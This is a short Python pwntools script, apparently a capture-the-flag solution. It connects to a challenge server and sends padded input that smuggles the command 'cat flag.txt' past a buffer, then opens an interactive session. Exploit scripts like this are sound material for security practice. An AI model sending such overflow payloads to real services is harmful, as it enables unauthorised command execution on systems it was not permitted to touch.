from pwn import *

# Connect to remote
conn = remote('ctf.acm.xstf.pt', 32775)

# payload
payload  = b'12345678'          
payload += b'A' * 8             
payload += b'cat flag.txt\x00'

# Send payload
conn.sendline(payload)

# Receive and print response
conn.interactive()
